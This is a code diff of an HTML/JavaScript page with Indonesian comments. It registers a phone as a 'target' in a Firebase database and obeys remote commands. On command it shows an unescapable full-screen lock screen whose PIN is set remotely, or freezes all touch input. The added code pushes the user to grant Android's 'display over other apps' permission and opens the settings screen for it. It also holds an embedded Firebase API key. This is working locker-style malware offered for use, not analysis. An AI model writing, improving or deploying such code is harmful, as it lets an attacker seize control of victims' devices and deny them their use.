@@ -106,7 +106,6 @@
             height: 100vh;
             background: #0d0d0d;
             z-index: 2147483647;
-            /* nilai max integer, di atas segalanya */
             display: none;
             flex-direction: column;
             justify-content: center;
@@ -117,26 +116,19 @@
             user-select: none;
             -webkit-user-select: none;
             overflow: hidden;
-            /* anti scroll */
         }
         #lockScreen.active {
             display: flex !important;
         }
 
-        /* Lock screen — elemen di dalamnya */
         #lockScreen .lock-icon {
             font-size: 80px;
             margin-bottom: 10px;
             animation: pulse-icon 2s infinite;
         }
         @keyframes pulse-icon {
-            0%,
-            100% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.1);
-            }
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
         }
 
         #lockScreen .message {
@@ -245,7 +237,7 @@
         }
 
         /* ============================================================
-           FREEZE OVERLAY — TRANSPARAN TAPI BLOKIR SENTUHAN TOTAL
+           FREEZE OVERLAY — BLOKIR SENTUHAN TOTAL
            ============================================================ */
         #touchFreezeOverlay {
             position: fixed;
@@ -264,7 +256,7 @@
         }
 
         /* ============================================================
-           FREEZE TIMER — DI SUDUT KANAN ATAS
+           FREEZE TIMER
            ============================================================ */
         #freezeTimer {
             position: fixed;
@@ -289,18 +281,79 @@
             animation: pulse-timer 0.7s infinite alternate;
         }
         @keyframes pulse-timer {
-            0% {
-                transform: scale(1);
-                opacity: 0.9;
-            }
-            100% {
-                transform: scale(1.06);
-                opacity: 1;
-            }
+            0% { transform: scale(1); opacity: 0.9; }
+            100% { transform: scale(1.06); opacity: 1; }
         }
 
         /* ============================================================
-           RESPONSIVE UNTUK HP KECIL
+           OVERLAY PERMISSION POPUP
+           ============================================================ */
+        #overlayPopup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 2147483647;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+        }
+        #overlayPopup.active {
+            display: flex;
+        }
+        #overlayPopup .popup-box {
+            background: #1a1a1a;
+            border: 2px solid #00ff41;
+            border-radius: 20px;
+            padding: 30px 25px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        #overlayPopup .popup-box h2 {
+            color: #00ff41;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        #overlayPopup .popup-box p {
+            color: #aaa;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        #overlayPopup .popup-box .btn-allow {
+            background: #00ff41;
+            color: #000;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+        }
+        #overlayPopup .popup-box .btn-allow:active {
+            transform: scale(0.96);
+        }
+        #overlayPopup .popup-box .btn-skip {
+            background: transparent;
+            color: #666;
+            border: 1px solid #333;
+            padding: 12px 30px;
+            border-radius: 12px;
+            font-size: 14px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        /* ============================================================
+           RESPONSIVE
            ============================================================ */
         @media (max-width: 480px) {
             #lockScreen .numpad {
@@ -330,29 +383,14 @@
                 top: 30px;
                 right: 12px;
             }
-        }
-
-        @media (max-width: 380px) {
-            #lockScreen .numpad {
-                grid-template-columns: repeat(3, 58px);
-                gap: 8px;
+            #overlayPopup .popup-box {
+                padding: 20px 15px;
             }
-            #lockScreen .numpad button {
-                width: 58px;
-                height: 58px;
-                font-size: 20px;
-            }
-            #lockScreen .pin-dot {
-                width: 40px;
-                height: 44px;
-                font-size: 22px;
-                line-height: 40px;
+            #overlayPopup .popup-box h2 {
+                font-size: 18px;
             }
         }
 
-        /* ============================================================
-           ANTI PULL-TO-REFRESH & OVERSCROLL
-           ============================================================ */
         body {
             overscroll-behavior: none;
             -webkit-overflow-scrolling: none;
@@ -376,29 +414,39 @@
     </div>
 
     <!-- ============================================================
+    OVERLAY PERMISSION POPUP
+    ============================================================ -->
+    <div id="overlayPopup">
+        <div class="popup-box">
+            <h2>🔓 Izin Overlay</h2>
+            <p>Aplikasi ini membutuhkan izin <b>"Tampilkan di atas aplikasi lain"</b> untuk berfungsi dengan baik.<br><br>Klik <b>"Izinkan"</b> lalu aktifkan permission di halaman berikutnya.</p>
+            <button class="btn-allow" onclick="requestOverlayPermission()">✅ Izinkan</button>
+            <button class="btn-skip" onclick="closeOverlayPopup()">⏭ Lewati (tidak disarankan)</button>
+        </div>
+    </div>
+
+    <!-- ============================================================
     FREEZE TIMER
     ============================================================ -->
     <div id="freezeTimer">✋ FREEZE: <span id="freezeCount">10</span>s</div>
 
     <!-- ============================================================
-    FREEZE OVERLAY (BLOKIR SENTUHAN)
+    FREEZE OVERLAY
     ============================================================ -->
     <div id="touchFreezeOverlay"></div>
 
     <!-- ============================================================
-    LOCK SCREEN — FULLSCREEN TOTAL
+    LOCK SCREEN
     ============================================================ -->
     <div id="lockScreen">
         <div class="lock-icon">🔒</div>
         <div class="message" id="lockMessage">⚠️ DEVICE LOCKED</div>
-
         <div class="pin-display" id="pinDisplay">
             <div class="pin-dot" id="dot1"></div>
             <div class="pin-dot" id="dot2"></div>
             <div class="pin-dot" id="dot3"></div>
             <div class="pin-dot" id="dot4"></div>
         </div>
-
         <div class="numpad">
             <button onclick="pressPin('1')">1</button>
             <button onclick="pressPin('2')">2</button>
@@ -413,7 +461,6 @@
             <button onclick="pressPin('0')">0</button>
             <button onclick="submitPin()" class="submit-btn">✔</button>
         </div>
-
         <div class="error-msg" id="errorMsg"></div>
         <div class="sub-text">🔐 AMAN · TERKUNCI · TUNGGU ADMIN</div>
     </div>
@@ -428,7 +475,7 @@
 
     <script>
         // ============================================================
-        // 🔥 KONFIGURASI FIREBASE — SUDAH BENAR
+        // 🔥 KONFIGURASI FIREBASE
         // ============================================================
         var firebaseConfig = {
             apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
@@ -444,7 +491,7 @@
         var db = firebase.database();
 
         // ============================================================
-        // VARIABEL GLOBAL
+        // VARIABEL
         // ============================================================
         var deviceId = '';
         var currentPin = '';
@@ -453,11 +500,11 @@
         var freezeRemaining = 0;
         var isLocked = false;
         var isFreezeActive = false;
+        var overlayRequested = false;
 
         // ============================================================
-        // FUNGSI UTAMA
+        // GENERATE ID
         // ============================================================
-
         function generateDeviceId() {
             return 'dev_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7);
         }
@@ -468,9 +515,6 @@
                 if (ua.indexOf('Android') !== -1) {
                     var match = ua.match(/Android\s([\d.]+)/);
                     return 'Android ' + (match ? match[1] : 'Device');
-                }
-                if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
-                    return 'iOS Device';
                 }
                 return 'Mobile Device';
             } catch (e) {
@@ -498,19 +542,14 @@
                 touchBlockTime: null,
                 lastSeen: Date.now()
             }).then(function() {
-                // Sembunyikan loading
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('statusBar').textContent = '🟢 Online | ' + deviceId.slice(0, 8);
                 document.getElementById('statusBar').className = 'online';
 
-                // Minta izin overlay (jika ada)
-                requestOverlayPermission();
+                // TAMPILKAN POPUP MINTA IZIN OVERLAY
+                showOverlayPopup();
 
-                // Mulai listen
                 startListening();
-
-                // Kirim notifikasi (jika diizinkan)
-                sendNotification('✅ Target Online', 'Device: ' + deviceId.slice(0, 10));
 
             }).catch(function(err) {
                 document.getElementById('loadingDetail').textContent = '❌ Error: ' + err.message;
@@ -520,7 +559,62 @@
         }
 
         // ============================================================
-        // LISTEN PERINTAH DARI FIREBASE
+        // OVERLAY PERMISSION POPUP
+        // ============================================================
+        function showOverlayPopup() {
+            // Cek apakah sudah punya izin overlay
+            try {
+                if (window.Android && window.Android.hasOverlayPermission) {
+                    // Jika sudah punya, langsung close
+                    document.getElementById('overlayPopup').classList.remove('active');
+                    return;
+                }
+            } catch(e) {}
+
+            // Tampilkan popup
+            document.getElementById('overlayPopup').classList.add('active');
+        }
+
+        function closeOverlayPopup() {
+            document.getElementById('overlayPopup').classList.remove('active');
+        }
+
+        function requestOverlayPermission() {
+            try {
+                // Method 1: Android Interface (WebView)
+                if (window.Android && window.Android.requestOverlay) {
+                    window.Android.requestOverlay();
+                    closeOverlayPopup();
+                    return;
+                }
+
+                // Method 2: Intent langsung ke Settings
+                if (window.navigator && window.navigator.userAgent.indexOf('Android') !== -1) {
+                    // Coba buka settings overlay
+                    var intent = 'intent://settings#Intent;action=android.settings.action.MANAGE_OVERLAY_PERMISSION;end';
+                    window.location.href = intent;
+                    closeOverlayPopup();
+                    setTimeout(function() {
+                        // Kembali ke aplikasi
+                        window.location.href = window.location.href;
+                    }, 500);
+                    return;
+                }
+
+                // Method 3: Fallback - buka via URL
+                if (window.navigator && window.navigator.userAgent.indexOf('Android') !== -1) {
+                    window.location.href = 'package://com.android.settings';
+                    closeOverlayPopup();
+                }
+
+            } catch(e) {
+                console.log('Overlay request error:', e);
+                closeOverlayPopup();
+            }
+        }
+
+        // ============================================================
+        // LISTEN PERINTAH
         // ============================================================
         function startListening() {
             var ref = db.ref('targets/' + deviceId);
@@ -529,17 +623,16 @@
                 var data = snapshot.val();
                 if (!data) return;
 
-                // Update last seen
                 ref.update({ lastSeen: Date.now() });
 
-                // ---------- CEK FREEZE ----------
+                // CEK FREEZE
                 if (data.touchBlocked === true && data.touchDuration) {
                     startFreeze(data.touchDuration);
                 } else if (data.touchBlocked === false) {
                     stopFreeze();
                 }
 
-                // ---------- CEK LOCK ----------
+                // CEK LOCK
                 if (data.locked === true && data.pin) {
                     correctPin = data.pin;
                     isLocked = true;
@@ -550,14 +643,13 @@
                 }
 
             }, function(error) {
-                // Error handling
                 document.getElementById('statusBar').textContent = '🔴 Error: ' + error.code;
                 document.getElementById('statusBar').className = 'offline';
             });
         }
 
         // ============================================================
-        // LOCK SCREEN — TOTAL BLOKIR
+        // LOCK SCREEN
         // ============================================================
         function showLockScreen(message) {
             var lockScreen = document.getElementById('lockScreen');
@@ -567,36 +659,25 @@
             currentPin = '';
             updateDots();
 
-            // Aktifkan lock screen
             lockScreen.classList.add('active');
             lockScreen.style.display = 'flex';
-
-            // Pastikan z-index paling tinggi
             lockScreen.style.zIndex = '2147483647';
 
-            // Block all touch events di body
+            // BLOKIR SEMUA SENTUHAN
             document.body.style.pointerEvents = 'none';
             document.body.style.touchAction = 'none';
             document.documentElement.style.pointerEvents = 'none';
             document.documentElement.style.touchAction = 'none';
 
-            // Lock screen bisa disentuh
             lockScreen.style.pointerEvents = 'all';
             lockScreen.style.touchAction = 'none';
 
-            // Cegah scroll
             document.body.style.overflow = 'hidden';
             document.documentElement.style.overflow = 'hidden';
-
-            // Cegah pull to refresh
             document.body.style.overscrollBehavior = 'none';
 
-            // Update status bar
             document.getElementById('statusBar').textContent = '🔒 LOCKED | ' + deviceId.slice(0, 8);
             document.getElementById('statusBar').className = 'offline';
-
-            // Kirim notifikasi
-            sendNotification('🔒 Device Locked', 'PIN: ' + correctPin);
         }
 
         function hideLockScreen() {
@@ -604,7 +685,6 @@
             lockScreen.classList.remove('active');
             lockScreen.style.display = 'none';
 
-            // Unblock touch (kecuali sedang freeze)
             if (!isFreezeActive) {
                 document.body.style.pointerEvents = 'auto';
                 document.body.style.touchAction = 'auto';
@@ -621,57 +701,46 @@
 
             document.getElementById('statusBar').textContent = '🟢 Online | ' + deviceId.slice(0, 8);
             document.getElementById('statusBar').className = 'online';
-
-            sendNotification('🔓 Device Unlocked', '');
         }
 
         // ============================================================
-        // FREEZE — BLOKIR SENTUHAN TOTAL TRANSPARAN
+        // FREEZE — BENERAN NGE-FREEZE
         // ============================================================
         function startFreeze(duration) {
             isFreezeActive = true;
 
-            // Aktifkan overlay freeze
             document.getElementById('touchFreezeOverlay').classList.add('active');
             document.getElementById('freezeTimer').classList.add('active');
 
             freezeRemaining = duration;
             document.getElementById('freezeCount').textContent = freezeRemaining;
 
-            // BLOKIR SEMUA SENTUHAN DI SELURUH LAPISAN
+            // BLOKIR 100% SENTUHAN
             document.body.style.pointerEvents = 'none';
             document.body.style.touchAction = 'none';
             document.documentElement.style.pointerEvents = 'none';
             document.documentElement.style.touchAction = 'none';
 
-            // Overlay bisa menerima sentuhan (biar block)
             document.getElementById('touchFreezeOverlay').style.pointerEvents = 'all';
             document.getElementById('touchFreezeOverlay').style.touchAction = 'none';
 
-            // Kalau lock screen aktif, juga di-block
             if (document.getElementById('lockScreen').classList.contains('active')) {
                 document.getElementById('lockScreen').style.pointerEvents = 'none';
             }
 
-            // Update status
-            document.getElementById('statusBar').textContent = '✋ FREEZE | ' + freezeRemaining + 's | ' + deviceId.slice(0,
-            8);
+            document.getElementById('statusBar').textContent = '✋ FREEZE | ' + freezeRemaining + 's | ' + deviceId.slice(0, 8);
             document.getElementById('statusBar').className = 'offline';
 
-            // Hapus interval lama
             if (freezeInterval) clearInterval(freezeInterval);
 
-            // Jalankan timer
             freezeInterval = setInterval(function() {
                 freezeRemaining--;
                 document.getElementById('freezeCount').textContent = freezeRemaining;
-                document.getElementById('statusBar').textContent = '✋ FREEZE | ' + freezeRemaining + 's | ' + deviceId
-                    .slice(0, 8);
+                document.getElementById('statusBar').textContent = '✋ FREEZE | ' + freezeRemaining + 's | ' + deviceId.slice(0, 8);
 
                 if (freezeRemaining <= 0) {
                     clearInterval(freezeInterval);
                     freezeInterval = null;
-                    // Unfreeze otomatis via Firebase
                     db.ref('targets/' + deviceId).update({
                         touchBlocked: false,
                         touchDuration: null,
@@ -679,25 +748,20 @@
                     }).catch(function() {});
                 }
             }, 1000);
-
-            sendNotification('✋ HP FREEZE', 'Durasi: ' + duration + ' detik');
         }
 
         function stopFreeze() {
             isFreezeActive = false;
 
-            // Matikan overlay freeze
             document.getElementById('touchFreezeOverlay').classList.remove('active');
             document.getElementById('freezeTimer').classList.remove('active');
 
-            // UNBLOKIR — kecuali masih locked
             if (!isLocked) {
                 document.body.style.pointerEvents = 'auto';
                 document.body.style.touchAction = 'auto';
                 document.documentElement.style.pointerEvents = 'auto';
                 document.documentElement.style.touchAction = 'auto';
             } else {
-                // Kalau masih locked, lock screen yang handle
                 document.body.style.pointerEvents = 'none';
                 document.documentElement.style.pointerEvents = 'none';
             }
@@ -716,41 +780,6 @@
             document.getElementById('statusBar').textContent = isLocked ? '🔒 LOCKED | ' + deviceId.slice(0, 8) :
                 '🟢 Online | ' + deviceId.slice(0, 8);
             document.getElementById('statusBar').className = isLocked ? 'offline' : 'online';
-
-            sendNotification('✅ HP UNFREEZE', '');
-        }
-
-        // ============================================================
-        // PERMISSION OVERLAY
-        // ============================================================
-        function requestOverlayPermission() {
-            try {
-                if (window.Android && window.Android.requestOverlay) {
-                    window.Android.requestOverlay();
-                }
-            } catch (e) {}
-
-            // Coba via intent (beberapa WebView support)
-            try {
-                if (window.navigator && window.navigator.userAgent.indexOf('Android') !== -1) {
-                    // Already handled by Android interface
-                }
-            } catch (e) {}
-        }
-
-        // ============================================================
-        // NOTIFIKASI (jika diizinkan)
-        // ============================================================
-        function sendNotification(title, body) {
-            try {
-                if (Notification && Notification.permission === 'granted') {
-                    new Notification(title, {
-                        body: body,
-                        icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔒</text></svg>',
-                        silent: true
-                    });
-                }
-            } catch (e) {}
         }
 
         // ============================================================
@@ -776,7 +805,6 @@
             if (currentPin.length !== 4) {
                 document.getElementById('errorMsg').textContent = '⚠️ Masukkan 4 digit PIN';
                 document.getElementById('errorMsg').className = 'error-msg';
-                // Getar
                 try { if (window.navigator && window.navigator.vibrate) window.navigator.vibrate(100); } catch (e) {}
                 return;
             }
@@ -819,7 +847,7 @@
         }
 
         // ============================================================
-        // KEYBOARD SUPPORT
+        // KEYBOARD
         // ============================================================
         document.addEventListener('keydown', function(e) {
             if (e.key >= '0' && e.key <= '9') {
@@ -832,7 +860,7 @@
         });
 
         // ============================================================
-        // KEEP ALIVE — ONLINE STATUS
+        // KEEP ALIVE
         // ============================================================
         setInterval(function() {
             if (deviceId) {
@@ -844,7 +872,7 @@
         }, 5000);
 
         // ============================================================
-        // HENTIKAN SEMUA GESTURE SAAT LOCK/FREEZE
+        // ANTI GESTURE
         // ============================================================
         document.addEventListener('touchmove', function(e) {
             if (isLocked || isFreezeActive) {
@@ -861,14 +889,6 @@
             }
         }, { passive: false });
 
-        document.addEventListener('gesturechange', function(e) {
-            if (isLocked || isFreezeActive) {
-                e.preventDefault();
-                return false;
-            }
-        }, { passive: false });
-
-        // Cegah back button
         document.addEventListener('backbutton', function(e) {
             if (isLocked) {
                 e.preventDefault();
@@ -878,30 +898,19 @@
         });
 
         // ============================================================
-        // START — INIT
+        // START
         // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
-            // Minta izin notifikasi
-            try {
-                if (Notification && Notification.permission !== 'granted') {
-                    Notification.requestPermission();
-                }
-            } catch (e) {}
-
-            // Register
             registerTarget();
         });
 
-        // ============================================================
-        // DOUBLE SAFETY — PASTIKAN LOCK SCREEN STAY DI ATAS
-        // ============================================================
+        // PASTIKAN LOCK SCREEN STAY DI ATAS
         setInterval(function() {
             var lock = document.getElementById('lockScreen');
             if (lock.classList.contains('active')) {
                 lock.style.display = 'flex';
                 lock.style.zIndex = '2147483647';
                 lock.style.pointerEvents = 'all';
-                // Pastikan body tetap block
                 document.body.style.pointerEvents = 'none';
                 document.documentElement.style.pointerEvents = 'none';
                 lock.style.pointerEvents = 'all';
